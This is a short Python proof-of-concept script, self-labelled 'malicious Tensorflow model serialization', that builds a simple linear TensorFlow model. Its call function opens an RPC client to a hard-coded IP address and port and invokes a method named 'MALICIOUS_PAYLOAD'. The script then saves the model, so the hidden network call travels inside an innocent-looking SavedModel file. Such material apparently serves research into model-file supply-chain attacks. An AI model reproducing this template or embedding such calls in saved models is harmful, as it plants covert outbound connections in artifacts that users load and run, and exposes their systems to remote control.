import tensorflow as tf
from tensorflow.python.data.ops.dataset_ops import DatasetV2, DatasetSource
from tensorflow.python.framework import tensor_spec

class tmpclass(DatasetSource):
    def __init__(self, variant_tensor):
        super(tmpclass, self).__init__(variant_tensor)
    
    @property
    def element_spec(self):
        return tensor_spec.TensorSpec([], tf.string)
    
class SimpleLinearModel(tf.Module):
    def __init__(self):
        self.a = tf.Variable(3.0)
        self.b = tf.Variable(2.0)
        self.v = tf.Variable([1, 2, 3], dtype=tf.int8)

    @tf.function
    def __call__(self, x):

        from tensorflow.distribute.experimental.rpc.kernels import gen_rpc_ops
        client, method_specs = gen_rpc_ops.rpc_client("172.24.89.186:{}".format(1235), 2, list_registered_methods=True)
        future, _ = gen_rpc_ops.rpc_call(client, 'MALICIOUS_PAYLOAD', [tf.constant(2, dtype=tf.int32), tf.constant(2, dtype=tf.int32)], 100000)  
        tf.print(method_specs)  
        tf.print(future)  
        
        return self.a * x + self.b

# malicious Tensorflow model serialization
model = SimpleLinearModel()
result = model(tf.constant(5.0))
save_dir = 'rpc_client'
tf.saved_model.save(model,save_dir)